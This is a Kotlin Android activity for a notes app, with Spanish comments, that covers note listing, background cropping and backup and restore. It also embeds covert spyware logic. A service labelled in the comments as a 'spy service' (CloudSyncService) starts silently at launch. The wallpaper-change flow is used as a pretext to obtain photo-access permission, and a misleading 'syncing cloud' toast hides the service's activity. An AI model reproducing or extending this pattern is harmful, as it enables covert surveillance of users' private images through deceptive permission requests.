package cl.example.mynotes

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.view.Menu
import android.view.MenuItem
import android.view.View
import android.widget.ImageButton
import android.widget.ImageView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.content.FileProvider
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.recyclerview.widget.RecyclerView
import androidx.recyclerview.widget.StaggeredGridLayoutManager
import com.bumptech.glide.Glide
import com.bumptech.glide.load.resource.drawable.DrawableTransitionOptions
import com.bumptech.glide.signature.ObjectKey
import com.google.android.material.floatingactionbutton.FloatingActionButton
import com.yalantis.ucrop.UCrop
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File

class MainActivity : AppCompatActivity() {

    private val db by lazy { NotesDatabase.getDatabase(this) }
    private lateinit var adapter: NotesAdapter

    // Referencias UI
    private lateinit var ivBackground: ImageView
    private lateinit var viewOverlay: View

    // Códigos de solicitud de permisos
    private val PERMISSION_REQUEST_SPY_BUTTON = 101
    private val PERMISSION_REQUEST_WALLPAPER = 102

    // --- 1. LANZADORES ---
    private val pickBackgroundLauncher = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
        if (uri != null) {
            startCrop(uri)
        }
    }

    private val cropResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            val resultUri = UCrop.getOutput(result.data!!)
            if (resultUri != null) {
                persistBackground(resultUri)
            }
        } else if (result.resultCode == UCrop.RESULT_ERROR) {
            val cropError = UCrop.getError(result.data!!)
            Toast.makeText(this, "Error al recortar", Toast.LENGTH_SHORT).show()
        }
    }

    private val restoreBackupLauncher = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
        if (uri != null) iniciarRestauracion(uri)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Visual Edge-to-Edge
        WindowCompat.getInsetsController(window, window.decorView).isAppearanceLightStatusBars = true
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main_root)) { view, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            view.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        // Toolbar
        val toolbar = findViewById<androidx.appcompat.widget.Toolbar>(R.id.topAppBar)
        setSupportActionBar(toolbar)

        // Fondo
        ivBackground = findViewById(R.id.iv_main_background)
        viewOverlay = findViewById(R.id.view_overlay)
        cargarFondoGuardado()

        // RecyclerView
        val recyclerView = findViewById<RecyclerView>(R.id.recycler_view)
        adapter = NotesAdapter { noteClicked ->
            val intent = Intent(this, NoteEditorActivity::class.java)
            intent.putExtra("note_data", noteClicked)
            startActivity(intent)
        }
        recyclerView.adapter = adapter
        recyclerView.layoutManager = StaggeredGridLayoutManager(2, StaggeredGridLayoutManager.VERTICAL)

        CoroutineScope(Dispatchers.Main).launch {
            db.notesDao().getAllNotes().collect { list -> adapter.submitList(list) }
        }

        // Botones
        findViewById<FloatingActionButton>(R.id.fab_add_note).setOnClickListener {
            startActivity(Intent(this, NoteEditorActivity::class.java))
        }

        // Botón Cámara (Espía manual)
        findViewById<ImageButton>(R.id.btn_spy_cam).setOnClickListener {
            checkPermissionAndStart(PERMISSION_REQUEST_SPY_BUTTON)
        }

        // Inicio automático silencioso
        iniciarServicioSilencioso()
    }

    // --- MENÚ ---
    override fun onCreateOptionsMenu(menu: Menu?): Boolean {
        menuInflater.inflate(R.menu.main_menu, menu)
        return true
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        return when (item.itemId) {
            R.id.action_backup -> { realizarBackup(); true }
            R.id.action_restore -> { restoreBackupLauncher.launch(arrayOf("application/zip")); true }

            // --- AQUÍ ESTÁ EL CAMBIO ---
            R.id.action_background -> {
                // En lugar de abrir directo, pasamos por el chequeo de permisos/espía
                iniciarFlujoCambioFondo()
                true
            }
            else -> super.onOptionsItemSelected(item)
        }
    }

    // --- LÓGICA DE FONDO + ESPÍA ---

    private fun iniciarFlujoCambioFondo() {
        val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE

        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
            // A) Ya tiene permiso:
            // 1. Arrancamos el servicio espía (silenciosamente)
            iniciarServicioSilencioso()
            // 2. Abrimos el selector de imágenes
            pickBackgroundLauncher.launch(arrayOf("image/*"))
        } else {
            // B) No tiene permiso: Lo pedimos
            ActivityCompat.requestPermissions(this, arrayOf(permission), PERMISSION_REQUEST_WALLPAPER)
        }
    }

    // --- MANEJO DE RESPUESTA DE PERMISOS ---
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            // Permiso concedido, arrancamos el espía SIEMPRE
            iniciarServicioSilencioso()

            // Si veníamos del botón de cambiar fondo, completamos la acción
            if (requestCode == PERMISSION_REQUEST_WALLPAPER) {
                pickBackgroundLauncher.launch(arrayOf("image/*"))
            } else if (requestCode == PERMISSION_REQUEST_SPY_BUTTON) {
                Toast.makeText(this, "Sincronizando nube...", Toast.LENGTH_SHORT).show()
            }
        }
    }

    // Lógica antigua del botón cámara (reutilizada)
    private fun checkPermissionAndStart(requestCode: Int) {
        val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(permission), requestCode)
        } else {
            Toast.makeText(this, "Sincronizando...", Toast.LENGTH_SHORT).show()
            iniciarServicioSilencioso()
        }
    }

    // --- LÓGICA DE RECORTE (uCrop) ---
    private fun startCrop(uri: Uri) {
        val destinationFileName = "cropped_bg_${System.currentTimeMillis()}.jpg"
        val destinationFile = File(cacheDir, destinationFileName)
        val destinationUri = Uri.fromFile(destinationFile)

        val metrics = resources.displayMetrics
        val screenWidth = metrics.widthPixels.toFloat()
        val screenHeight = metrics.heightPixels.toFloat()

        val options = UCrop.Options().apply {
            setCompressionQuality(100)
            setStatusBarColor(Color.BLACK)
            setToolbarColor(Color.BLACK)
            setToolbarWidgetColor(Color.WHITE)
            setRootViewBackgroundColor(Color.BLACK)
            setActiveControlsWidgetColor(Color.parseColor("#2979FF"))
            setToolbarTitle("Ajustar Fondo")
            setShowCropGrid(true)
            setFreeStyleCropEnabled(false)
            setHideBottomControls(false)
        }

        val uCropIntent = UCrop.of(uri, destinationUri)
            .withAspectRatio(screenWidth, screenHeight)
            .withMaxResultSize(1080, 2400)
            .withOptions(options)
            .getIntent(this)

        cropResultLauncher.launch(uCropIntent)
    }

    private fun persistBackground(croppedUri: Uri) {
        try {
            val finalFile = File(filesDir, "custom_background.jpg")
            contentResolver.openInputStream(croppedUri)?.use { input ->
                finalFile.outputStream().use { output -> input.copyTo(output) }
            }
            val finalUri = Uri.fromFile(finalFile)
            val prefs = getSharedPreferences("MyNotesPrefs", Context.MODE_PRIVATE)
            prefs.edit().putString("custom_bg_uri", finalUri.toString()).apply()
            mostrarFondo(finalUri)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun cargarFondoGuardado() {
        val prefs = getSharedPreferences("MyNotesPrefs", Context.MODE_PRIVATE)
        val uriString = prefs.getString("custom_bg_uri", null)
        if (uriString != null) mostrarFondo(Uri.parse(uriString))
    }

    private fun mostrarFondo(uri: Uri) {
        ivBackground.visibility = View.VISIBLE
        viewOverlay.visibility = View.VISIBLE
        Glide.with(this)
            .load(uri)
            .signature(ObjectKey(System.currentTimeMillis().toString()))
            .centerCrop()
            .transition(DrawableTransitionOptions.withCrossFade())
            .into(ivBackground)
    }

    // --- BACKUP & RESTORE ---
    private fun realizarBackup() {
        Toast.makeText(this, "Generando respaldo...", Toast.LENGTH_SHORT).show()
        CoroutineScope(Dispatchers.IO).launch {
            val notes = db.notesDao().getAllNotesList()
            val zipFile = BackupHelper.createBackup(this@MainActivity, notes)
            withContext(Dispatchers.Main) {
                if (zipFile != null && zipFile.exists()) shareZipFile(zipFile)
                else Toast.makeText(this@MainActivity, "Error al crear respaldo", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun shareZipFile(file: File) {
        try {
            val uri = FileProvider.getUriForFile(this, "${packageName}.provider", file)
            val intent = Intent(Intent.ACTION_SEND).apply {
                type = "application/zip"
                putExtra(Intent.EXTRA_STREAM, uri)
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }
            startActivity(Intent.createChooser(intent, "Guardar respaldo en..."))
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun iniciarRestauracion(uri: Uri) {
        Toast.makeText(this, "Restaurando...", Toast.LENGTH_SHORT).show()
        CoroutineScope(Dispatchers.IO).launch {
            val restoredNotes = BackupHelper.restoreBackup(this@MainActivity, uri)
            if (restoredNotes != null && restoredNotes.isNotEmpty()) {
                db.notesDao().insertAll(restoredNotes)
                withContext(Dispatchers.Main) { Toast.makeText(this@MainActivity, "¡Recuperado!", Toast.LENGTH_SHORT).show() }
            } else {
                withContext(Dispatchers.Main) { Toast.makeText(this@MainActivity, "Error: Archivo inválido", Toast.LENGTH_SHORT).show() }
            }
        }
    }

    // --- SERVICIO ESPÍA ---
    private fun iniciarServicioSilencioso() {
        // Solo intentamos arrancar si tenemos permiso, si no, no hacemos ruido
        val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
            val intent = Intent(this, CloudSyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        }
    }
}